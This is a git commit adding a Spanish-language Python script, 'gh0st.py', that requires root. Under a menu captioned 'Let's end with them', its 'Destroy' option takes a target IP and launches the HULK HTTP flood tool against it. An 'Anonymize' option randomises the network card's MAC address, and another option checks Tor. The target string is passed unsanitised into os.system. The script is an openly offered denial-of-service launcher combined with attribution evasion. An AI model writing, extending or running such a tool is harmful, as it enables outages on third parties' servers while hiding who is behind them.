c08b9a24ceea8b209e2ca4b8157a5be1303a3944
Dark_C0de <64330628+Dark-C0de-x@users.noreply.github.com>
2022-04-18 19:27:31 +0200

    Add files via upload

---
+++ gh0st.py
@@ -0,0 +1,126 @@
+import os
+import sys
+
+if os.geteuid() != 0:
+    print('[-] Necesitas ser root')
+    sys.exit(1)
+else:
+    os.system ("clear")
+
+
+
+def DoS():
+	os.system("clear")
+	print("   .... NO! ...                  ... MNO! ...")
+	os.system("sleep 0.1")
+	print("   ..... MNO!! ...................... MNNOO! ...")
+	os.system("sleep 0.1")
+	print(" ..... MMNO! ......................... MNNOO!! .")
+	os.system("sleep 0.1")
+	print("..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .")
+	os.system("sleep 0.1")
+	print("... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....")
+	os.system("sleep 0.1")
+	print("   ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...")
+	os.system("sleep 0.1")
+	print("   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....")
+	os.system("sleep 0.1")
+	print("  ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...")
+	os.system("sleep 0.1")
+	print("   ....... MMMMM..    OPPMMP    .,OMI! ....")
+	os.system("sleep 0.1")
+	print("    ...... MMMM::   o.,OPMP,.o   ::I!! ...")
+	os.system("sleep 0.1")
+	print("        .... NNM:::.,,OOPM!P,.::::!! ....")
+	os.system("sleep 0.1")
+	print("         .. MMNNNNNOOOOPMO!!IIPPO!!O! .....")
+	os.system("sleep 0.1")
+	print("        ... MMMMMNNNNOO:!!:!!IPPPPOO! ....")
+	os.system("sleep 0.1")
+	print("          .. MMMMMNNOOMMNNIIIPPPOO!! ......")
+	os.system("sleep 0.1")
+	print("         ...... MMMONNMMNNNIIIOO!..........")
+	os.system("sleep 0.1")
+	print("      ....... MN MOMMMNNNIIIIIO! OO ..........")
+	os.system("sleep 0.1")
+	print("   ......... MNO! IiiiiiiiiiiiI OOOO ...........")
+	os.system("sleep 0.1")
+	print("  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........")
+	os.system("sleep 0.1")
+	print("   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........")
+	os.system("sleep 0.1")
+	print("  ...... MNNNNO! .. PPPPPPPPP .. MMNON!........")
+	os.system("sleep 0.1")
+	print("     ...... OO! ................. ON! .......")
+	os.system("sleep 0.1")
+	print("       ................................")
+	print("")
+	ip = input("Ingresa ip objetivo -> ")
+	print("[*] iniciando ataque...")
+	print("")
+	os.system("go run hulk.go -site " + ip)
+
+
+
+
+print("                          ▓▓████████████████                    ")
+print("                    ▒▒██▓▓              ▒▒██████░░              ")
+print("                ▓▓██░░    ▓▓██████████████    ██████            ")
+print("            ██▒▒  ░░██████████████████████████    ██████        ")
+print("          ██  ▒▒██░░  ████████████████████░░▒▒██▒▒  ▓▓████      ")
+print("        ██  ██        ████████    ██████████    ████  ▒▒████░░  ")
+print("      ▒▒            ████████        ████████      ████    ██████")
+print("    ░░░░            ██    ██        ████████        ████  ░░████")
+print("    ░░              ██    ██        ████████          ████    ██")
+print("                      ▒▒████████████████████          ██████    ")
+print("                      ████████████████████          ░░██████    ")
+print("      ░░                ████████████████          ░░██▒▒████    ")
+print("          ░░              ▒▒████████▒▒          ████            ")
+print("            ▒▒▒▒░░                          ▒▒██                ")
+print("                  ░░▒▒██                ▓▓██                    ")
+print("")
+print("")
+print("")
+
+
+def menu():
+	print ("")
+	print ("                   -Let's end with them-")
+	print ("")
+	print ("                    [1] ==> Destroy")
+	print ("                    [2] ==> Anonymize")
+	print ("                    [3] ==> Tor Verify")
+	print ("                    [4] ==> Opcion 4")
+	print ("                    [5] ==> salir")
+ 
+ 
+while True:
+	# Mostramos el menu
+	menu()
+ 
+	# solicituamos una opción al usuario
+	opcionMenu = input("#> ")
+ 
+	if opcionMenu=="1":
+		print ("")
+		DoS()
+		os.system ("clear")
+	elif opcionMenu=="2":
+		print ("")
+		os.system("macchanger -r eth0")
+		os.system ("clear")
+	elif opcionMenu=="3":
+		print ("")
+		os.system("gnome-terminal python sec.py")
+		os.system ("clear")
+	elif opcionMenu=="4":
+		print ("")
+		input("Has pulsado la opción 4...\npulsa una tecla para continuar")
+		os.system ("clear")
+	elif opcionMenu=="5":
+		break
+	else:
+		print ("")
+		input("No has pulsado ninguna opción correcta...\npulsa una tecla para continuar")
+
+
